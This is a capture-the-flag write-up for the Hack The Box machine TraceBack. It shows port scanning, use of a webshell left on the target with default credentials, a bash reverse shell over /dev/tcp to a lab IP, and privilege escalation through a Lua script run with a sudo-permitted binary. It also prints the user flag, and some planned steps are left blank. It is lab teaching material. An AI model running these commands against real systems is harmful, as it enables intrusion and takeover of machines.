# TraceBack
> Write-up author: jon-brandy


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a5389983-7994-42b7-87d6-c39c262b8597)


## Lessons Learned:
1. Enumeration.
2. Utilizing dropped backdoor.
3. Writing Lua.
4. Generating ssh-key to get more stable shell.
5. Manipulating SSH Motd.

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sV -sC traceback.htb --min-rate 1000 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-25 19:53 PDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9625518e6c830748ce114b1fe56d8a28 (RSA)
|   256 54bd467114bdb242a1b6b02d94143b0d (ECDSA)
|_  256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Help us
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.67 seconds
```

1. Based from the nmap results above, seems the machine runs web application at port 80 and opens ssh login at port 22.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0ed872db-def1-40fd-b05b-f01b2f8d6548)


2. Seems the webapp is already compromised and the attacker left a backdoor which is accessible he said.
3. Hence let's execute directory listing using **dirsearch**.
4. However, dirsearch resulting to none. It means the webshell filename is not common.
5. Reviewing the message shown, resulting to no clue other than searching the `Xh4H` name online.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f7d67e1f-c1d5-4919-b0f7-3617db19484b)



6. Traversing on the internet resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f5d980a2-9a97-4b54-a70e-a82e3600451a)


7. Adding **webshell** to our search query, resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/75d799d5-5024-41b6-bf40-3d71becb4ddc)


8. The first result, should be our interest.

> GITHUB

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1384da27-8377-4203-b854-bb513772c9e8)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e6c49331-c7e6-4672-9fe2-3b2ca7ab052a)


9. Enumerating each webshell file, the backdoor dropped is --> `smevk.php`.

> Enter creds --> `admin:admin` (shown at the source code).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/363c04a5-96e9-4972-b799-ee967df3f46e)


10. Indeed it seems the best backdoor 🤲🏻.
11. Long story short, after traversing to `/home/webadmin`, found a note from sysadmin team.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/051e6bac-d543-485c-8429-a6da4faa6d3b)

12. Reviewing the bash history file, found that a binary named **luvit** seems inside the sudo permission.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd1ac823-a2ee-4330-ad17-afd3a7a4c729)


13. This could be used for our privesc method.
14. Great! Anyway let's get more comfy enumeration by getting a reverse shell.
15. I used simple bash reverse shell:

```txt
bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
```

16. Set up a listener at port **1337** than enter it on the **execute** box.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ef6adcff-da39-4c24-bc8b-1fe47e9bbeea)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a27e9b7-5e5d-4ad5-9b8c-70f7baa8668c)


17. Remembering the **luvit** binary is inside the **sysadmin** home directory, we need to traverse there, but currently we are denied.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7ab4b96-ae8f-45df-8825-c177f4ff3123)


18. BUT thing to note, upon checking the sudo permission seems **luvit** is executable by any user.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30fcc402-ea95-46e5-83d8-9b12e350fb76)


19. Remembering we can specify a username, hence introducing 2 steps can be done to gain access to sysadmin's home directory.
20. The first step is using the **luvit** binary, the second method is by generating the ssh-keys to get stable shell as **sysadmin**.

===

### 1st Step

- Sending shell spawn LOCs to lua.

```
echo "require('os');" > sysad.lua
echo "os.execute('/bin/bash');" > sysad.lua
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b472f3aa-ca88-4f55-93a5-b44f419c6402)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/54a0f835-d4c9-4fda-a9d1-840b85d5aa60)


### 2nd Step

- Generating ssh-keys

  

## USER FLAG

```
4835038ff249e1ae23de765fc1110e3d
```

## IMPORTANT LINKS

```

```
